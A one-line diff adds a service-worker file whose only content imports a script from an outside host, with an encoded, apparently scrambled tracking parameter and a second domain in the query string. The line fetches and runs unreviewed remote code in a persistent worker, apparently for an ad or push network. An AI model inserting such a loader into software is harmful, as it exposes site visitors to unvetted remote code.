@@ -1,0 +1,1 @@
+importScripts('https://metosk.com/v1/sw-import.js?h=waWQiOjEwNDE5NjQsInNpZCI6MTA0ODIzNywid2lkIjo4OTYwOSwic3JjIjoyLCJwbSI6MH0=eyJ&d=allowninja.imfast.io');
